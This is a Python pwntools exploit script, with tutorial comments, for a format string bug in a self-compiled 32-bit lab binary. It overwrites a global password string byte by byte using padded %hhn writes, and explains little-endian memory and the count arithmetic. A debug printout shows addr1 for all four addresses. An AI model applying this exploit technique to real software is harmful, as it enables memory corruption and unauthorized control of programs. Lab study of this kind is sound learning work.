# gcc -m32 -fno-stack-protector -no-pie -g fs.c -o fs

from pwn import *
import re

s = process('./fs', shell=True)

elf = ELF('./fs')

# read the program banner to obtain the runtime address of passwd
banner = s.recvline().decode(errors='ignore')
m = re.search(r'VAR passwd@ (0x[0-9a-fA-F]+):', banner)
if not m:
    s.close()
    raise SystemExit("passwd address not found in program output")
passwd_addr = int(m.group(1), 16)

# pwndbg> p &passwd
# $4 = (char (*)[8]) 0x804c01c <passwd>
# pwndbg> x passwd
# 0x804c01c <passwd.0>:   0x65663473            --->> 's4fe' in little-endian
# pwndbg> x 0x804c01c
# 0x804c01c <passwd.0>:   0x65663473            --->> 's4fe' in little-endian
# pwndbg> x 0x804c01d
# 0x804c01d <passwd.0+1>: 0x00656634            --->> '4fe\0' in little-endian
# pwndbg> x 0x804c01e
# 0x804c01e <passwd.0+2>: 0x00006566            --->> 'fe\0\0' in little-endian
# pwndbg> x 0x804c01f
# 0x804c01f <passwd.0+3>: 0x00000065            --->> 'e\0\0\0' in little-endian
# pwndbg> x 0x804c020
# 0x804c020 <passwd.0+4>: 0x00000000
# pwndbg> x 0x804c021
# 0x804c021 <passwd.0+5>: 0x00000000
# pwndbg> x 0x804c022
# 0x804c022 <passwd.0+6>: 0x00000000
# pwndbg> x 0x804c023
# 0x804c023 <passwd.0+7>: 0x00000000
# pwndbg> x 0x804c024
# 0x804c024 <completed.0>:        0x00000000

"""
In C and on x86, memory is **byte-addressable**. 
This means every single 8-bit (1-byte) bucket in your RAM has its own unique, private address.
`0x804c01c` points to a 1-byte bucket.
`0x804c01d` points to the *next* 1-byte bucket.

However, the CPU and the Debugger rarely want to look at just one grain of sand. 
They usually operate in **Words**. On a 32-bit system, a "Word" is 4 bytes (32 bits).

When we use the `x` (examine) command in GDB/pwndbg without extra flags, the default behavior is **`x/1xw`** (Examine 1 hex Word).

We are telling GDB: "Start at `0x804c01c` and show me the next **4 bytes** as a single 32-bit number."
* **The Math:** It pulls the bytes from `0x804c01c`, `0x804c01d`, `0x804c01e`, and `0x804c01f`.

When we increment the address by 1 (`x 0x804c01d`), we are shifting your 4-byte "viewing window" by one byte.

1. **At `0x804c01c`:** GDB sees `73 34 66 65`. Because of **Little-Endian**, it displays this as `0x65663473` 
(reversing the bytes for human readability).


2. **At `0x804c01d`:** GDB sees `34 66 65 00` (since the address `0x804c020` has `0x00`). 
The first byte is now `34`. In Little-Endian display, this becomes `0x00656634`, where the addresses that 
represent this value are, sequentially: `0x804c020` `0x804c01f` `0x804c01e` `0x804c01d`.

If we want to see **exactly** what is in that 8-bit bucket and nothing else, you must tell GDB to use **byte size**:

> `pwndbg> x/1xb 0x804c01c`
> `0x804c01c: 0x73` (This is the 's')
"""

# pwndbg> x/1xb 0x804c01c
# 0x804c01c <passwd.0>:   0x73
# pwndbg> x/1xb 0x804c01d
# 0x804c01d <passwd.0+1>: 0x34
# pwndbg> x/1xb 0x804c01e
# 0x804c01e <passwd.0+2>: 0x66
# pwndbg> x/1xb 0x804c01f
# 0x804c01f <passwd.0+3>: 0x65
# pwndbg> x/1xb 0x804c020
# 0x804c020 <passwd.0+4>: 0x00
# pwndbg> x/1xb 0x804c021
# 0x804c021 <passwd.0+5>: 0x00
# pwndbg> x/1xb 0x804c022
# 0x804c022 <passwd.0+6>: 0x00
# pwndbg> x/1xb 0x804c023
# 0x804c023 <passwd.0+7>: 0x00

addr1 = passwd_addr       # 's' -> c (0x63) -> 99
addr2 = passwd_addr + 1   # '4' -> 4 (0x34) -> 52
addr3 = passwd_addr + 2   # 'f' -> g (0x67) -> 103
addr4 = passwd_addr + 3   # 'e' -> e (0x65) -> 101

print("\n ======== \n")

byte1 = 0x63
print("byte1: ", byte1)
byte2 = 0x34
print("byte2: ", byte2)
byte3 = 0x67
print("byte3: ", byte3)
byte4 = 0x65
print("byte4: ", byte4)

print("\n ======== \n")


print("passwd addresses to write the new string:")
print(f"Address 1: {hex(addr1)}")
print(f"Address 2: {hex(addr1)}")
print(f"Address 3: {hex(addr1)}")
print(f"Address 4: {hex(addr1)}")

print("\n ======== \n")

payload = p32(addr1) + p32(addr2) + p32(addr3) + p32(addr4)

payload_temp = "AAAA" + 10 * ".%08x"
# AAAA.00000040.f7ea65c0.ffc3ac00.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
#         1        2        3      ! 4 !       5        6        7        8        9       10   
#                                  &BUFFER

# Payload to send:
# Be careful that the number of printed characters **does not reset** after a %n !!!
# addr1+addr2+addr3+addr4+ ... +%4$hhn+ ... +%5$hhn+ ... +%6$hhn+ ... +%7$hhn
# 1st number of chars -> 99-4*4 (because we already wrote 4 addresses, each with 4 bytes == 4 chars)
# 2nd number of chars -> 52-99 % 256 (because we already wrote 99 chars; here we need % 256 because 52-99<0)
# 3rd number of chars -> 103-(99+52) % 256
# 4th number of chars -> 101-(99+52+103) % 256


# For example, if I need the total count of written characters so far to be 52, but I've already written 99,
# I can leverage %hhn, which only considers the last/a single byte, and since a byte can only hold values from 0 to 255,
# I can do (99 + <number>) that goes beyond 255, and it will wrap around like this:
# 99 + 156 = 255 ---> % 256 = 255
# 99 + 157 = 256 ---> % 256 = 0
# 99 + 158 = 257 ---> % 256 = 1
# ...
# 99 + 209 = 308 ---> % 256 = 52
    
# But in this case, I have written 16 chars already (the 4 addresses), so:
# If I want to write byte 0x63 (99 decimal) next:
# padding = (99 - 16) % 256 = 83
# Binary representation of 83 is 01010011, which in hexa is 0x00000053, so %hhn will write 0x53 to the target address.
# And then 52:
# padding = (52 - 99) % 256 = (-47) % 256 = 209
# Total number of chars written so far will be 99 + 209 = 308
# 
# if I first wrote 99, and now I want 52, I need to overflow past 256, 
# and as %n will count the total written chars so far, it will count 99 + 209 = 308,  but if we do 308 % 256 = 52, 
# which is what the "hh" specifier in %hhn does:
# Binary representation of 308 is 00000001 00110100, which in hexa is 0x00000134, so %hhn will write 0x34 to the target address. 
# %hhn takes the lowest byte: 0x34, which is 52 decimal.
    
# %paddingx: Prints 'padding' characters to increase the internal counter. 
# %N$hhn: THE MAGIC. 
#   'N' is the argument index (4, 5, 6, 7). 
#   '$' means "Direct Access".
#   'hhn' means "Write the total count as a 1-byte char to the address in Arg N". 
    
written = len(payload)
print(f"Total number of chars written before byte 1: {written}")

padding1 = (byte1 - written) % 256
payload += f"%{padding1}x".encode() + "%4$hhn".encode()
print(f"padding 1: {padding1}")
written += padding1

print(f"Total number of chars written before byte 2: {written}")

padding2 = (byte2 - written) % 256
payload += f"%{padding2}x".encode() + "%5$hhn".encode()
print(f"padding 2: {padding2}")
written += padding2

print(f"Total number of chars written before byte 3: {written}")

padding3 = (byte3 - written) % 256
payload += f"%{padding3}x".encode() + "%6$hhn".encode()
print(f"padding 3: {padding3}")
written += padding3

print(f"Total number of chars written before byte 4: {written}")

padding4 = (byte4 - written) % 256
payload += f"%{padding4}x".encode() + "%7$hhn".encode()
print(f"padding 4: {padding4}")
written += padding4

print(f"Total number of chars written after byte 4: {written}")

s.sendline(payload)
result = s.recvall(timeout=1).decode(errors='ignore')
s.close()
print(result)